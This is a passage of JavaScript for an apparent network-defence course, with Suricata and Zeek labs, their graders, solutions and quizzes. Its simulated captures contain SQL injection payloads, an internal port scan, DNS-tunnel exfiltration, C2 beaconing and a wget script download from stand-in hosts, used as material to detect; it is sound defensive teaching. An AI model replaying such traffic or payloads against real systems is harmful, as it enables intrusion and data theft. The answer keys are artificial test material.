      { q: "How do SYN cookies help?", options: ["They block the attacker's IP", "The server keeps no state for a SYN; it's rebuilt from the ACK", "They encrypt the handshake", "They make the backlog bigger"], answer: 1, why: "Spoofed SYNs never send an ACK, so they cost nothing." },
      { q: "Which status code does a rate limit usually return?", options: ["403", "404", "429", "503"], answer: 2, why: "429 Too Many Requests (nginx's default for limit_req is 503 unless you set limit_req_status)." }
    ]
  });

  /* ================================================================== NET-306 Suricata IDS */
  var C2 = "kc-cdn-sync.example";
  var BROKEN_LOCAL = "# Your own rules go here.\n# Added by Sam (2026-11-09): flag Telnet logins\nalert tcp any any -> $HOME_NET 23 (msg:\"KESTREL Telnet login prompt\"; flow:to_server,established; content:\"login\"; rev:1;)\n";
  function idsCapture(o) {
    o = o || {};
    var t0 = at(6), L2 = [], A1 = "203.0.113.50", A2 = "198.51.100.23", OFF = "10.20.5.47";
    ["10.20.0.10", "10.20.0.15", "10.20.0.21", "10.20.0.31", "10.20.0.40", "10.20.0.45"].forEach(function (h, i) { L2 = L2.concat(synProbe(t0 + i * 0.4, A1, h, 40100 + i, 22, h !== "10.20.0.45" && h !== "10.20.0.31", 88000 + i)); });
    ["1%27%20AND%201%3D1--", "1%27%20UNION%20SELECT%20NULL--", "1%27%20AND%20SLEEP(5)--"].forEach(function (q, i) { L2 = L2.concat(conv(t0 + 30 + i, A2, LEG, 52100 + i, 80, [{ data: req("GET", "/search.php?q=" + q, "intranet.kestrel.internal", "sqlmap/1.8.2#stable (https://sqlmap.org)") }, { b: true, data: resp(200, "OK", "Apache/2.4.29 (Ubuntu)", "Content-Type: text/html\r\n", "<p>No results</p>"), gap: 0.02 }])); });
    [0, 1].forEach(function (i) { L2 = L2.concat(conv(t0 + 60 + i * 30, o.curlFrom || ME, "93.184.215.14", 50400 + i, 80, [{ data: req("GET", "/", "example.com", "curl/8.5.0") }, { b: true, data: resp(200, "OK", "ECS (dce/2694)", "Content-Type: text/html\r\n", "<!doctype html>"), gap: 0.09 }])); });
    L2 = L2.concat(conv(t0 + 120, OFF, LEG, 53000, 8081, [{ data: req("GET", "/script", "kc-legacy-01:8081", "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0") }, { b: true, data: resp(200, "OK", "Jetty(10.0.13)", "X-Jenkins: 2.387.3\r\nContent-Type: text/html\r\n", "<title>Script Console [Jenkins]</title>"), gap: 0.03 }]));
    L2 = L2.concat(conv(t0 + 125, OFF, LEG, 53010, 8081, [{ data: req("GET", "/job/deploy-prod/", "kc-legacy-01:8081", "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0") }, { b: true, data: resp(200, "OK", "Jetty(10.0.13)", "X-Jenkins: 2.387.3\r\n", "<title>deploy-prod [Jenkins]</title>"), gap: 0.03 }]));
    L2 = L2.concat(P.dns(t0 + 150, LEG, "10.20.0.2", 41900, 0x1d2e, "update." + C2, "A", [{ type: "A", data: "203.0.113.200", ttl: 60 }]));
    L2 = L2.concat(P.dns(t0 + 151, ME, "10.20.0.2", 41902, 0x1d30, "kc-db-01.kestrel.internal", "A", [{ type: "A", data: "10.20.0.21", ttl: 3600 }]));
    L2.push(P.udp(t0 + 170, OFF, LEG, 40312, 161, { snmp: { community: "public", oid: ".1.3.6.1.2.1.1.1.0", reqid: 10780 } }), P.udp(t0 + 170.002, LEG, OFF, 161, 40312, { snmp: { community: "public", oid: ".1.3.6.1.2.1.1.1.0", resp: true, value: "Linux kc-legacy-01 4.15.0-213-generic", reqid: 10780 } }));
    L2 = L2.concat(conv(t0 + 200, A1, LEG, 52011, 21, [{ b: true, data: "220 (vsFTPd 3.0.3)\r\n" }, { data: "USER anonymous\r\n", gap: 0.5 }, { b: true, data: "331 Please specify the password.\r\n", gap: 0.001 }, { data: "PASS guest@\r\n", gap: 0.4 }, { b: true, data: "530 Login incorrect.\r\n", gap: 0.8 }]));
    return sortT(L2);
  }
  function idsSys(sys) { M3.preinstall(sys, "suricata"); M3.preinstall(sys, "tshark"); M3.preinstall(sys, "jq"); M2.putRoot(sys, "/etc/suricata/rules/local.rules", BROKEN_LOCAL, 420, 0, 0, NOW - 2 * DAY); }
  function localRules(r) { var out = []; L(r.read("/etc/suricata/rules/local.rules") || "").forEach(function (l) { if (!l.trim() || /^\s*#/.test(l)) return; try { out.push(N.suricata.parseRule(l)); } catch (e) { out.push(null); } }); return out; }
  function suriVars() { return { HOME_NET: "[10.20.0.0/24]", EXTERNAL_NET: "!" + "[10.20.0.0/24]", HTTP_PORTS: "[80]" }; }
  // the alerts a rule set raises on a list of packets
  function alertsOf(rules, pkts) { return N.suricata.run(null, pkts, rules.filter(Boolean), suriVars()); }
  function fastLog(r) { return r.read("ids/fast.log"); }
  function lastRunAfter(r, re) { var k = idx(r, re); return k >= 0 && after(r, k, /\bsuricata\b.*-r\b/); }
  LABS.push({
    id: "net-306", n: 27, module: 3, ticket: "NET-306", xp: 180, layer: "L3–7",
    title: "Teach the IDS",
    topic: "Suricata: rules, test mode, fast.log and eve.json, your own rules, tuning",
    from: DEV,
    story: "<p>We're piloting <b>Suricata</b>, an intrusion detection system: it reads traffic, matches it against thousands of rules and raises alerts. It's installed on kc-web-01 with the community rule set, and I've saved six minutes of server LAN traffic in <code>~/captures/ids.pcap</code> to try it on.</p><p>Sam added a rule of our own last week and something's off with it. Run Suricata on the capture, read what it found, then teach it two things it doesn't know about our network and quiet the noise.</p>",
    learn:
      "<h3>A Suricata rule</h3>" + code("alert http $EXTERNAL_NET any -> $HOME_NET any (msg:\"ET SCAN Sqlmap SQL Injection Scan\"; flow:to_server,established; http.user_agent; content:\"sqlmap\"; nocase; classtype:attempted-recon; sid:2008538; rev:9;)") +
      '<table class="t"><tr><th>Part</th><th>Meaning</th></tr><tr><td><code>alert</code></td><td>action: alert, pass (stop inspecting the flow), drop (IPS mode)</td></tr><tr><td><code>http</code></td><td>protocol: tcp, udp, icmp, or an app layer: http, dns, tls, ftp</td></tr><tr><td><code>$EXTERNAL_NET any -> $HOME_NET any</code></td><td>source address and port, direction, destination (variables from suricata.yaml)</td></tr><tr><td><code>msg</code></td><td>the alert\'s text</td></tr><tr><td><code>flow:to_server,established</code></td><td>only client-to-server packets of a set-up connection</td></tr><tr><td><code>http.user_agent; content:"sqlmap"</code></td><td>a <b>sticky buffer</b> picks the field, then content matches inside it (<code>http.uri</code>, <code>http.host</code>, <code>dns.query</code>, <code>tls.sni</code>…)</td></tr><tr><td><code>sid</code>, <code>rev</code></td><td>unique rule number (use 1000000+ for your own) and its revision. <b>Required.</b></td></tr></table>' +
      "<h3>Running it</h3>" + code("sudo suricata -T                                     # test the config and every rule\nmkdir -p ~/ids\nsuricata -r ~/captures/ids.pcap -l ~/ids              # read a capture, write logs to ~/ids") +
      "<p><code>fast.log</code> has one line per alert; <code>eve.json</code> has the same alerts as JSON, with more detail:</p>" + ex("cat ~/ids/fast.log") + ex("jq -r '.alert.signature' ~/ids/eve.json | sort | uniq -c | sort -rn") +
      "<p>Rules live in <code>/etc/suricata/rules/</code>: <code>suricata.rules</code> is downloaded by <code>suricata-update</code> (don't edit it, updates overwrite it); <b>your</b> rules go in <code>local.rules</code>.</p>" +
      "<h3>Tuning</h3><p>An IDS that alerts on everything is ignored. To silence a rule for traffic you know is fine, add a <code>pass</code> rule for exactly that traffic: a matching pass rule stops all further inspection of the flow.</p>" + code("pass http 10.20.0.99 any -> $EXTERNAL_NET any (msg:\"backup agent is fine\"; http.user_agent; content:\"backup-agent\"; sid:1000010; rev:1;)"),
    files: { "captures/ids.pcap": N.pcapFile(idsCapture()) },
    system: idsSys,
    diagram: ["legacy"],
    starter: "",
    objectives: [
      {
        id: "test", text: "Test Suricata's configuration. Sam's rule in <code>local.rules</code> fails to load: fix it so <code>sudo suricata -T</code> loads every rule.",
        hints: ["suricata -T names the problem. Every rule needs a sid: use one from 1000000 up.", "sudo suricata -T\nsudo nano /etc/suricata/rules/local.rules (add sid:1000001; before rev:1;)\nsudo suricata -T"],
        check: function (r) {
          var lr = localRules(r);
          if (!lr.length || lr.some(function (x) { return !x; })) return "local.rules still has a rule that doesn't parse (missing sid?).";
          return ran(r, /\bsuricata\b.*-T\b/, function (e) { return outHas(e, /0 rules failed/) && outHas(e, /successfully loaded/); }) ? true : "Run sudo suricata -T to prove every rule loads.";
        }
      },
      {
        id: "run", text: "Run Suricata on <code>~/captures/ids.pcap</code> with its logs in <code>~/ids</code>, and read the alerts.",
        hints: ["mkdir ~/ids, then suricata -r FILE -l DIR, then cat fast.log.", "mkdir -p ~/ids\nsuricata -r ~/captures/ids.pcap -l ~/ids\ncat ~/ids/fast.log"],
        check: function (r) { var f = fastLog(r); if (f === null) return "Run suricata -r ~/captures/ids.pcap -l ~/ids."; if (!/Sqlmap/.test(f)) return "~/ids/fast.log has no community-rule alerts: run it on the capture."; return ran(r, /\b(cat|less|head|tail|grep|jq|awk|cut)\b.*ids\/(fast\.log|eve\.json)/) ? true : "Read the alerts: cat ~/ids/fast.log."; }
      },
      {
        id: "top", text: "Which signature fired <b>most</b>? Count alerts per signature and write its <b>sid</b> to <code>~/top-sid.txt</code>.",
        hints: ["jq -r '.alert.signature_id' ~/ids/eve.json | sort | uniq -c | sort -rn (or cut fast.log on [**]).", "jq -r '.alert.signature_id' ~/ids/eve.json | sort | uniq -c | sort -rn\necho 2008538 > ~/top-sid.txt"],
        check: function (r) { return word(r, "top-sid.txt") === "2008538" ? true : "Count the alerts per signature: the most frequent one's sid (the middle number in [1:SID:REV])."; }
      },
      {
        id: "jenkins", text: "Write a rule in <code>local.rules</code> that alerts when anyone requests Jenkins' <b>script console</b> (the URI <code>/script</code> on port 8081). Re-run on the capture: your alert must fire once, for 10.20.5.47.",
        hints: ["alert http any any -> $HOME_NET 8081 (msg:...; flow:to_server,established; http.uri; content:\"/script\"; sid:1000002; rev:1;)", "echo 'alert http any any -> $HOME_NET 8081 (msg:\"KESTREL Jenkins script console\"; flow:to_server,established; http.uri; content:\"/script\"; sid:1000002; rev:1;)' | sudo tee -a /etc/suricata/rules/local.rules\nsuricata -r ~/captures/ids.pcap -l ~/ids\ngrep KESTREL ~/ids/fast.log"],
        check: function (r) {
          var lr = localRules(r).filter(Boolean), pk = N.readPcap(r.read("captures/ids.pcap") || "") || idsCapture();
          var own = alertsOf(lr, pk).filter(function (a) { return a.p.tcp && a.p.tcp.dport === 8081; });
          if (!own.length) return "No rule in local.rules alerts on the /script request (port 8081).";
          if (own.length > 1 || own.some(function (a) { return !/\/script/.test(a.p.data || ""); })) return "Your rule also fires on other Jenkins requests: match the URI /script.";
          var sid = own[0].r.sid, f = fastLog(r) || "";
          return new RegExp("\\[1:" + sid + ":\\d+\\].*10\\.20\\.5\\.47").test(f) ? true : "Re-run suricata on the capture so ~/ids/fast.log has your alert.";
        }
      },
      {
        id: "dns", text: "kc-legacy-01 looked up <code>update." + C2 + "</code>, a known malware control domain. Write a <b>DNS</b> rule (sticky buffer <code>dns.query</code>) for any lookup under <code>" + C2 + "</code>, and show it firing.",
        hints: ["alert dns any any -> any any (msg:...; dns.query; content:\"" + C2 + "\"; nocase; sid:1000003; rev:1;)", "echo 'alert dns any any -> any any (msg:\"KESTREL lookup of known C2 domain\"; dns.query; content:\"" + C2 + "\"; nocase; sid:1000003; rev:1;)' | sudo tee -a /etc/suricata/rules/local.rules\nsuricata -r ~/captures/ids.pcap -l ~/ids\ngrep C2 ~/ids/fast.log"],
        check: function (r) {
          var lr = localRules(r).filter(Boolean), pk = N.readPcap(r.read("captures/ids.pcap") || "") || idsCapture();
          var own = alertsOf(lr, pk).filter(function (a) { return a.p.dns; });
          if (!own.length) return "No rule in local.rules alerts on the DNS lookup of the C2 domain.";
          if (own.some(function (a) { return a.p.dns.q.indexOf(C2) < 0; })) return "Your DNS rule fires on other lookups too.";
          if (!own.every(function (a) { return /dns\.query/.test(a.r.raw) || a.r.contents.some(function (c) { return c.buf === "dns.query"; }); })) return "Use the dns.query sticky buffer.";
          var sid = own[0].r.sid;
          return new RegExp("\\[1:" + sid + ":").test(fastLog(r) || "") ? true : "Re-run on the capture so your DNS alert is in ~/ids/fast.log.";
        }
      },
      {
        id: "tune", text: "The <b>curl User-Agent Outbound</b> alerts are kc-web-01's own health checks. Silence them for <b>kc-web-01 only</b> with a pass rule in local.rules (don't edit suricata.rules), and re-run: no curl alerts, everything else still there.",
        hints: ["pass http 10.20.0.15 any -> $EXTERNAL_NET any (... http.user_agent; content:\"curl/\"; sid:1000004; rev:1;)", "echo 'pass http 10.20.0.15 any -> $EXTERNAL_NET any (msg:\"kc-web-01 health checks\"; flow:to_server,established; http.user_agent; content:\"curl/\"; sid:1000004; rev:1;)' | sudo tee -a /etc/suricata/rules/local.rules\nsuricata -r ~/captures/ids.pcap -l ~/ids\ngrep -c curl ~/ids/fast.log"],
        check: function (r) {
          var et = r.read("/etc/suricata/rules/suricata.rules") || "";
          if (!/^alert http \$HOME_NET any -> \$EXTERNAL_NET any \(msg:"ET POLICY curl User-Agent Outbound"/m.test(et)) return "Leave suricata.rules alone (suricata-update would undo it): tune in local.rules.";
          var f = fastLog(r) || "";
          if (/curl User-Agent/.test(f)) return "~/ids/fast.log still has curl alerts: add the pass rule and re-run.";
          if (!/Sqlmap/.test(f)) return "Re-run Suricata so ~/ids/fast.log shows the other alerts still firing.";
          var all = loadAll(r), other = idsCapture({ curlFrom: "10.20.0.21" });
          return alertsOf(all, other).some(function (a) { return a.r.sid === 2013028; }) ? true : "Your pass rule is too broad: the same curl from another server (10.20.0.21) should still alert.";
        }
      }
    ],
    solution: lines("sudo suricata -T", "sudo sed -i 's/content:\"login\"; rev:1;/content:\"login\"; sid:1000001; rev:1;/' /etc/suricata/rules/local.rules", "sudo suricata -T",
      "mkdir -p ~/ids", "suricata -r ~/captures/ids.pcap -l ~/ids", "cat ~/ids/fast.log", "jq -r '.alert.signature_id' ~/ids/eve.json | sort | uniq -c | sort -rn", "echo 2008538 > ~/top-sid.txt",
      "echo 'alert http any any -> $HOME_NET 8081 (msg:\"KESTREL Jenkins script console\"; flow:to_server,established; http.uri; content:\"/script\"; sid:1000002; rev:1;)' | sudo tee -a /etc/suricata/rules/local.rules",
      "echo 'alert dns any any -> any any (msg:\"KESTREL lookup of known C2 domain\"; dns.query; content:\"" + C2 + "\"; nocase; sid:1000003; rev:1;)' | sudo tee -a /etc/suricata/rules/local.rules",
      "echo 'pass http 10.20.0.15 any -> $EXTERNAL_NET any (msg:\"kc-web-01 health checks\"; flow:to_server,established; http.user_agent; content:\"curl/\"; sid:1000004; rev:1;)' | sudo tee -a /etc/suricata/rules/local.rules",
      "sudo suricata -T", "suricata -r ~/captures/ids.pcap -l ~/ids", "cat ~/ids/fast.log"),
    debrief: "<p>Out of the box Suricata saw the SSH sweep, the sqlmap scan (the noisiest), the clear-text FTP login and SNMP's <code>public</code> community. It knew nothing about what matters <b>to us</b>: someone opening Jenkins' script console and a server looking up a malware domain. Two short rules fixed that.</p><p>Sam's rule had no <code>sid</code>, so Suricata skipped it with an error that only <code>-T</code> made obvious: always test before you reload. And the pass rule is how real teams keep an IDS useful: scoped to the one host whose behaviour is known-good, so the same thing from anywhere else still alerts.</p>",
    realworld: "Suricata runs on pfSense/OPNsense home firewalls and Security Onion; the Emerging Threats Open rules are free. Try it on a capture of your own traffic.",
    quiz: [
      { q: "Where do your own Suricata rules go?", options: ["suricata.rules", "local.rules (or another file you list in suricata.yaml)", "suricata.yaml", "/var/log/suricata"], answer: 1, why: "suricata-update rewrites suricata.rules." },
      { q: "What does http.user_agent do in a rule?", options: ["Sets the user agent", "It's a sticky buffer: the following content matches inside the User-Agent header", "Blocks the client", "Logs the header"], answer: 1, why: "Sticky buffers point content matches at one field." },
      { q: "Which rule option is mandatory?", options: ["msg", "sid", "classtype", "flow"], answer: 1, why: "Every signature needs a unique sid; without one it fails to load." }
    ]
  });
  function loadAll(r) { var all = []; ["/etc/suricata/rules/suricata.rules", "/etc/suricata/rules/local.rules"].forEach(function (f) { L(r.read(f) || "").forEach(function (l) { if (!l.trim() || /^\s*#/.test(l)) return; try { all.push(N.suricata.parseRule(l)); } catch (e) { /* skipped like Suricata does */ } }); }); return all; }

  /* ================================================================== NET-307 Zeek logs */
  var BEACON = "185.220.101.7", TUNNEL = "x9-relay.example";
  function b32(seed, n) { var c = "abcdefghijklmnopqrstuvwxyz234567", s = "", h = seed; for (var i = 0; i < n; i++) { h = (h * 1103515245 + 12345) & 0x7fffffff; s += c.charAt((h >>> 16) % 32); } return s; }
  function zeekCapture() {
    var t0 = at(20), L2 = [];
    // normal: lookups and HTTPS from the web server, apt over HTTP, office browsing
    L2 = L2.concat(P.dns(t0 + 5, ME, "10.20.0.2", 40001, 0x0a01, "kc-db-01.kestrel.internal", "A", [{ type: "A", data: "10.20.0.21", ttl: 3600 }]));
    L2 = L2.concat(P.dns(t0 + 9, "10.20.0.60", "10.20.0.2", 40002, 0x0a02, "github.com", "A", [{ type: "A", data: "140.82.121.4", ttl: 60 }]));
    L2 = L2.concat(conv(t0 + 10, "10.20.0.60", "140.82.121.4", 51000, 443, [{ enc: { tls: 22, len: 517, seed: 1 }, app: "TLS ClientHello", sni: "github.com" }, { b: true, enc: { tls: 22, len: 1448, seed: 2 }, gap: 0.02 }, { b: true, enc: { tls: 23, len: 1448, seed: 3 }, gap: 0.03 }, { b: true, enc: { tls: 23, len: 1448, seed: 4 }, gap: 0.031 }, { enc: { tls: 23, len: 90, seed: 5 }, gap: 0.04 }]));
    L2 = L2.concat(P.dns(t0 + 20, ME, "10.20.0.2", 40003, 0x0a03, "archive.ubuntu.com", "A", [{ type: "A", data: "91.189.91.83", ttl: 60 }]));
    L2 = L2.concat(conv(t0 + 21, ME, "91.189.91.83", 51010, 80, [{ data: req("GET", "/ubuntu/dists/noble-updates/InRelease", "archive.ubuntu.com", "Debian APT-HTTP/1.3 (2.7.14)") }, { b: true, data: resp(200, "OK", "Apache/2.4.29 (Ubuntu)", "Content-Type: text/plain\r\n", new Array(60).join("SHA256: 0f3c9d2e7b1a5c6d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d 1203 main/binary-amd64/Packages.gz\n")), gap: 0.04 }]));
    L2 = L2.concat(conv(t0 + 40, "10.20.5.31", "10.20.0.10", 52000, 443, [{ enc: { tls: 22, len: 517, seed: 6 }, app: "TLS ClientHello", sni: "kestrel.example.com" }, { b: true, enc: { tls: 22, len: 1448, seed: 7 }, gap: 0.01 }, { enc: { tls: 23, len: 300, seed: 8 }, gap: 0.02 }, { b: true, enc: { tls: 23, len: 1200, seed: 9 }, gap: 0.03 }]));
    // kc-backup-01 beacons out every 60 s, then uploads
    for (var i = 0; i < 10; i++) L2 = L2.concat(conv(t0 + 60 + i * 60, "10.20.0.31", BEACON, 53000 + i, 443, [{ enc: { tls: 22, len: 517, seed: 40 + i }, app: "TLS ClientHello", sni: "cdn-update.example" }, { b: true, enc: { tls: 22, len: 820, seed: 60 + i }, gap: 0.08 }, { enc: { tls: 23, len: 64, seed: 80 + i }, gap: 0.16 }, { b: true, enc: { tls: 23, len: 48, seed: 90 + i }, gap: 0.08 }]));
    var up = [{ enc: { tls: 22, len: 517, seed: 100 }, app: "TLS ClientHello", sni: "cdn-update.example" }, { b: true, enc: { tls: 22, len: 820, seed: 101 }, gap: 0.08 }];
    for (var u = 0; u < 60; u++) up.push({ enc: { tls: 23, len: 1448, seed: 200 + u }, gap: 0.003 });
    L2 = L2.concat(conv(t0 + 61 + 10 * 60, "10.20.0.31", BEACON, 53100, 443, up));
    // kc-data-01 tunnels data out through DNS, downloads a script, scans the database server
    for (var q = 0; q < 24; q++) L2 = L2.concat(P.dns(t0 + 300 + q * 2.5, "10.20.0.45", "10.20.0.2", 44000 + q, 0x2000 + q, b32(q + 7, 52) + "." + b32(q + 99, 30) + ".t." + TUNNEL, "TXT", [{ type: "TXT", data: "\"ok\"", ttl: 0 }]));
    L2 = L2.concat(P.dns(t0 + 400, "10.20.0.45", "10.20.0.2", 44100, 0x2100, "dl.203-0-113-200.example", "A", [{ type: "A", data: "203.0.113.200", ttl: 300 }]));
    L2 = L2.concat(conv(t0 + 401, "10.20.0.45", "203.0.113.200", 54000, 80, [{ data: req("GET", "/tools/p.sh", "dl.203-0-113-200.example", "Wget/1.21.4") }, { b: true, data: resp(200, "OK", "nginx", "Content-Type: application/x-sh\r\n", "#!/bin/sh\nwhile true; do sleep 60; done\n"), gap: 0.05 }]));
    var scanned = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 11211, 27017];
    scanned.forEach(function (p, k) { L2 = L2.concat(synProbe(t0 + 500 + k * 0.01, "10.20.0.45", "10.20.0.21", 45000 + k, p, p === 22 || p === 5432 ? true : p === 3306 || p === 6379 || p === 9200 || p === 27017 ? null : false, 99000 + k)); });
    return sortT(L2);
  }
  function zeekSys(sys) { M3.preinstall(sys, "zeek"); M3.preinstall(sys, "tshark"); }
  LABS.push({
    id: "net-307", n: 28, module: 3, ticket: "NET-307", xp: 180, layer: "L3–7",
    title: "A day in the logs",
    topic: "Zeek: conn.log, dns.log, http.log, ssl.log, zeek-cut; beacons, DNS tunnels, internal scans",
    from: DEV,
    story: "<p>Suricata only tells you about things it has a rule for. For hunting, I want a record of <b>every</b> conversation, and that's what <b>Zeek</b> gives you: it turns a capture into tidy logs, one line per connection, DNS query, HTTP request and TLS handshake.</p><p>Here's twelve minutes of server LAN traffic in <code>~/captures/lan.pcap</code>. Something on our network is misbehaving and I'm not saying what. Run Zeek and go hunting.</p>",
    learn:
      "<h3>Running Zeek</h3><p>Zeek writes its logs into the <b>current folder</b>, so make one first:</p>" + code("mkdir -p ~/zeek && cd ~/zeek\nzeek -r ~/captures/lan.pcap\nls") +
      '<table class="t"><tr><th>Log</th><th>One line per</th><th>Useful fields</th></tr><tr><td>conn.log</td><td>connection (TCP, UDP, ICMP)</td><td>id.orig_h, id.resp_h, id.resp_p, proto, service, duration, orig_bytes, resp_bytes, conn_state</td></tr><tr><td>dns.log</td><td>DNS query</td><td>query, qtype_name, answers</td></tr><tr><td>http.log</td><td>HTTP request</td><td>method, host, uri, user_agent, status_code</td></tr><tr><td>ssl.log</td><td>TLS handshake</td><td>server_name, version</td></tr></table>' +
      "<h3>zeek-cut</h3><p>The logs are tab-separated with a header; <code>zeek-cut</code> picks columns by name, ready for sort, uniq and awk:</p>" + ex("cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service orig_bytes") + ex("zeek-cut query < dns.log | sort | uniq -c | sort -rn") +
      "<h3>conn_state</h3>" + '<table class="t"><tr><th>State</th><th>Means</th></tr><tr><td>SF</td><td>normal: set up and closed</td></tr><tr><td>S0</td><td>a SYN with <b>no answer</b> (filtered, or nothing there)</td></tr><tr><td>REJ</td><td>SYN answered with RST: closed port</td></tr><tr><td>RSTO / RSTR</td><td>reset by the originator / responder</td></tr></table>' +
      "<h3>What hunters look for</h3><ul><li><b>Beacons</b>: the same internal host contacting the same outside address at a regular interval (malware checking in).</li><li><b>Big uploads</b>: orig_bytes much bigger than resp_bytes, to somewhere unusual.</li><li><b>DNS tunnelling</b>: many long, random-looking names under one domain: data hidden in the questions.</li><li><b>Tools fetched over HTTP</b>: scripts and binaries downloaded by wget or curl.</li><li><b>Internal scans</b>: one host touching many ports on another, lots of S0 and REJ.</li></ul>",
    files: { "captures/lan.pcap": N.pcapFile(zeekCapture()) },
    system: zeekSys,
    diagram: ["backup", "data"],
    starter: "",
    objectives: [
      {
        id: "run", text: "Run Zeek on <code>~/captures/lan.pcap</code> with its logs in <code>~/zeek</code>.",
        hints: ["Zeek writes to the current folder: cd into ~/zeek first.", "mkdir -p ~/zeek && cd ~/zeek\nzeek -r ~/captures/lan.pcap\nls"],
        check: function (r) { var c = r.read("zeek/conn.log"); return c && /#path\tconn/.test(c) ? true : "~/zeek/conn.log doesn't exist yet: cd ~/zeek, then zeek -r ~/captures/lan.pcap."; }
      },
      {
        id: "upload", text: "Which internal host <b>sent</b> the most data out (orig_bytes) in one connection, and to where? Write <code>HOST DESTINATION</code> to <code>~/upload.txt</code>.",
        hints: ["zeek-cut id.orig_h id.resp_h orig_bytes from conn.log, sorted numerically on the bytes.", "cd ~/zeek\nzeek-cut id.orig_h id.resp_h orig_bytes < conn.log | sort -k3 -n -r | head -3\necho '10.20.0.31 " + BEACON + "' > ~/upload.txt"],
        check: function (r) { if (!ran(r, /\bzeek-cut\b.*orig_bytes|\bzeek-cut\b.*\borig_bytes\b|\bawk\b.*conn\.log/)) return "Pull orig_bytes out of conn.log with zeek-cut."; var t = word(r, "upload.txt"); return t.indexOf("10.20.0.31") >= 0 && t.indexOf(BEACON) >= 0 ? true : "The connection with the largest orig_bytes: its originator and responder."; }
      },
      {
        id: "beacon", text: "That host also <b>beacons</b>: count its connections to that address and find the TLS server name it uses. Write <code>COUNT NAME</code> to <code>~/beacon.txt</code>.",
        hints: ["grep the destination in conn.log and count; ssl.log's server_name column has the name.", "cd ~/zeek\ngrep -c " + BEACON + " conn.log\nzeek-cut id.orig_h server_name < ssl.log | sort | uniq -c\necho '11 cdn-update.example' > ~/beacon.txt"],
        check: function (r) { if (!ran(r, /ssl\.log/)) return "ssl.log has the server names."; var t = word(r, "beacon.txt"); return /\b11\b/.test(t) && /cdn-update\.example/.test(t) ? true : "How many connections from 10.20.0.31 to " + BEACON + ", and their server_name?"; }
      },
      {
        id: "tunnel", text: "One host is hiding data in <b>DNS queries</b>. Write the host and the domain the long names end in to <code>~/tunnel.txt</code> (<code>HOST DOMAIN</code>).",
        hints: ["zeek-cut id.orig_h query from dns.log; look for long random names.", "cd ~/zeek\nzeek-cut id.orig_h qtype_name query < dns.log | awk 'length($3) > 50'\necho '10.20.0.45 " + TUNNEL + "' > ~/tunnel.txt"],
        check: function (r) { if (!ran(r, /dns\.log/)) return "Look through dns.log."; var t = word(r, "tunnel.txt"); return t.indexOf("10.20.0.45") >= 0 && t.indexOf(TUNNEL) >= 0 ? true : "Which host sent the long TXT queries, and under which domain?"; }
      },
      {
        id: "download", text: "The same host downloaded a <b>shell script</b> over plain HTTP. Write its full URL to <code>~/download.txt</code>.",
        hints: ["http.log has host and uri (and user_agent).", "cd ~/zeek\nzeek-cut id.orig_h host uri user_agent < http.log\necho 'http://dl.203-0-113-200.example/tools/p.sh' > ~/download.txt"],
        check: function (r) { if (!ran(r, /http\.log/)) return "Look at http.log."; return word(r, "download.txt") === "http://dl.203-0-113-200.example/tools/p.sh" ? true : "http:// + the host + the uri of the .sh download."; }
      },
      {
        id: "scan", text: "Then it <b>scanned</b> another server. Which one, and how many of the probed ports gave <b>no answer at all</b> (S0)? Write <code>SERVER COUNT</code> to <code>~/scan.txt</code>.",
        hints: ["conn.log: id.orig_h 10.20.0.45, conn_state S0.", "cd ~/zeek\nzeek-cut id.orig_h id.resp_h id.resp_p conn_state < conn.log | grep '^10.20.0.45' | grep -v udp\nzeek-cut id.orig_h id.resp_h conn_state < conn.log | awk '$1 == \"10.20.0.45\" && $3 == \"S0\"' | wc -l\necho '10.20.0.21 4' > ~/scan.txt"],
        check: function (r) { if (!ran(r, /\bconn\.log\b|zeek-cut.*conn_state/)) return "conn_state in conn.log tells you how each probe ended."; var t = word(r, "scan.txt"); return t.indexOf("10.20.0.21") >= 0 && /(^|\s)4(\s|$)/.test(t) ? true : "The scanned server, and the number of its S0 connections from 10.20.0.45."; }
      }
    ],
    solution: lines("mkdir -p ~/zeek && cd ~/zeek", "zeek -r ~/captures/lan.pcap", "ls",
      "zeek-cut id.orig_h id.resp_h orig_bytes < conn.log | sort -k3 -n -r | head -3", "echo '10.20.0.31 " + BEACON + "' > ~/upload.txt",
      "grep -c " + BEACON + " conn.log", "zeek-cut id.orig_h server_name < ssl.log | sort | uniq -c", "echo '11 cdn-update.example' > ~/beacon.txt",
      "zeek-cut id.orig_h qtype_name query < dns.log | awk 'length($3) > 50'", "echo '10.20.0.45 " + TUNNEL + "' > ~/tunnel.txt",
      "zeek-cut id.orig_h host uri user_agent < http.log", "echo 'http://dl.203-0-113-200.example/tools/p.sh' > ~/download.txt",
      "zeek-cut id.orig_h id.resp_h conn_state < conn.log | awk '$1 == \"10.20.0.45\" && $3 == \"S0\"' | wc -l", "echo '10.20.0.21 4' > ~/scan.txt"),
    debrief: "<p>Two compromised machines, found without a single signature. <b>kc-backup-01</b> checks in with <code>cdn-update.example</code> every 60 seconds like clockwork, then pushed out about 87 KB in one go: a beacon and an exfiltration. <b>kc-data-01</b> leaks data inside DNS questions (long random labels under <code>" + TUNNEL + "</code>), fetched a shell script with wget and then scanned kc-db-01, finding SSH and PostgreSQL open and four ports silent behind the firewall.</p><p>That's the Zeek way: log everything boringly, then ask questions with sort, uniq and awk. Next: put it all together on a real intrusion.</p>",
    realworld: "Zeek ships in Security Onion and Corelight sensors; malware-traffic-analysis.net has captures to practise on. RITA (from Active Countermeasures) finds beacons in Zeek logs automatically.",
    quiz: [
      { q: "conn_state S0 means…", options: ["Normal connection", "A SYN that got no reply", "Reset by the server", "Encrypted"], answer: 1, why: "S0: connection attempt seen, no reply." },
      { q: "Which pattern suggests DNS tunnelling?", options: ["Many lookups of google.com", "Many long, random-looking names under one domain", "A lookup that fails", "TTL 300"], answer: 1, why: "The data is encoded in the labels of the questions." },
      { q: "What makes a beacon stand out?", options: ["Its size", "Regular timing to the same destination", "It uses UDP", "It's encrypted"], answer: 1, why: "Malware checks in on a schedule; humans don't." }
    ]
  });

  /* ================================================================== NET-308 Reconstruct an intrusion (capstone) */
  var ATT = "198.51.100.23", DROP = "203.0.113.200", EXFIL = "kc-sync-cdn.example";
  function incident() {
